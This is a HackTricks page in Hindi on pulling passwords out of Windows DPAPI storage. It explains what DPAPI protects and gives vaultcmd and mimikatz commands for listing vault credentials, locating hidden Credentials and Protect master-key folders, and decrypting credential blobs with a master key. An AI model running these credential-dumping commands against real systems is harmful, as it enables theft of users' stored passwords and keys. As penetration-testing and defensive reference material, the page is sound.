# DPAPI - पासवर्ड निकालना

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित देखना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का एक्सेस चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और **मुझे** **ट्विटर** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **को**

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) **स्पेन** में सबसे महत्वपूर्ण साइबर सुरक्षा घटना है और **यूरोप** में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने** के मिशन के साथ, यह कांग्रेस प्रौद्योगिकी और साइबर सुरक्षा विशेषज्ञों के लिए एक उफान मिलने का समारोह है।

{% embed url="https://www.rootedcon.com/" %}

## DPAPI क्या है

डेटा संरक्षण API (DPAPI) प्रमुख रूप से **असममित निजी कुंजीयों का सममित एन्क्रिप्शन** के लिए Windows ऑपरेटिंग सिस्टम में प्रयोग किया जाता है, जो उपयोगकर्ता या सिस्टम रहस्यों को एंट्रोपी के महत्वपूर्ण स्रोत के रूप में उपयोग करता है। यह दृष्टिकोण डेवलपरों के लिए एन्क्रिप्शन को सरल बनाता है जिससे उन्हें उपयोगकर्ता के लॉगऑन रहस्यों से उत्पन्न कुंजी का उपयोग करके डेटा को एन्क्रिप्ट करने की सुविधा प्रदान करता है या सिस्टम एन्क्रिप्शन के लिए, सिस्टम के डोमेन प्रमाणीकरण रहस्यों का उपयोग करके, इससे डेवलपरों को खुद ही एन्क्रिप्शन कुंजी की सुरक्षा का प्रबंधन करने की आवश्यकता को दूर कर देता है।

### DPAPI द्वारा संरक्षित डेटा

DPAPI द्वारा संरक्षित व्यक्तिगत डेटा में शामिल हैं:

- इंटरनेट एक्सप्लोरर और गूगल क्रोम के पासवर्ड और ऑटो-पूर्णता डेटा
- Outlook और Windows Mail जैसे एप्लिकेशन के ईमेल और आंतरिक FTP खाता पासवर्ड
- साझा फोल्डर, संसाधन, वायरलेस नेटवर्क्स और Windows Vault के पासवर्ड, इनक्लूडिंग एन्क्रिप्शन कुंजी
- रिमोट डेस्कटॉप कनेक्शन, .NET पासपोर्ट, और विभिन्न एन्क्रिप्शन और प्रमाणीकरण उद्देश्यों के लिए निजी कुंजी
- Credential Manager द्वारा प्रबंधित नेटवर्क पासवर्ड और CryptProtectData का उपयोग करने वाले एप्लिकेशन्स में व्यक्तिगत डेटा, जैसे Skype, MSN मैसेंजर, और अधिक

## वॉल्ट सूची
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## प्रमाणीकरण फ़ाइलें

**सुरक्षित रखी गई प्रमाणीकरण फ़ाइलें** निम्नलिखित स्थान पर हो सकती हैं:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
```
mimikatz का उपयोग करके `dpapi::cred` का उपयोग करके क्रेडेंशियल्स जानकारी प्राप्त करें, प्रतिक्रिया में आप एन्क्रिप्टेड डेटा और guidMasterKey जैसी रोचक जानकारी पा सकते हैं।
```
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
आप **mimikatz मॉड्यूल** `dpapi::cred` का उपयोग कर सकते हैं उपयुक्त `/masterkey` के साथ डिक्रिप्ट करने के लिए:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## मास्टर कुंजी

उपयोगकर्ता के RSA कुंजी को एन्क्रिप्ट करने के लिए उपयोग की जाने वाली DPAPI कुंजी `%APPDATA%\Microsoft\Protect\{SID}` निर्देशिका में संग्रहीत की जाती है, जहां {SID} उपयोगकर्ता का [**सुरक्षा पहचानकर्ता**](https://en.wikipedia.org/wiki/Security_Identifier) है। **DPAPI कुंजी उपयोगकर्ता की निजी कुंजियों को सुरक्षित रखने वाली मास्टर कुंजी के साथ ही एक ही फ़ाइल में संग्रहीत की जाती है**। यह आम तौर पर 64 बाइट के यादृच्छिक डेटा होता है। (ध्यान दें कि यह निर्देशिका संरक्षित है, इसे आप `cmd` से `dir` का उपयोग करके सूचीबद्ध नहीं कर सकते हैं, लेकिन आप PS से इसे सूचीबद्ध कर सकते हैं)।
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
एक उपयोगकर्ता के एक बंडल मास्टर कुंजियों का यह दिखने लगेगा:

![](<../../.gitbook/assets/image (324).png>)

सामान्यत: **प्रत्येक मास्टर कुंजी एक एन्क्रिप्टेड सिमेट्रिक कुंजी होती है जो अन्य सामग्री को डिक्रिप्ट कर सकती है**। इसलिए, इस **एन्क्रिप्टेड मास्टर कुंजी** को **निकालना** बहुत दिलचस्प है ताकि बाद में जो **अन्य सामग्री** इसके साथ एन्क्रिप्ट की गई है, उसे **डिक्रिप्ट** किया जा सके।

### मास्टर कुंजी निकालें और डिक्रिप्ट करें

मास्टर कुंजी को निकालने और इसे डिक्रिप्ट करने का उदाहरण देखने के लिए [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) पोस्ट की जाँच करें।
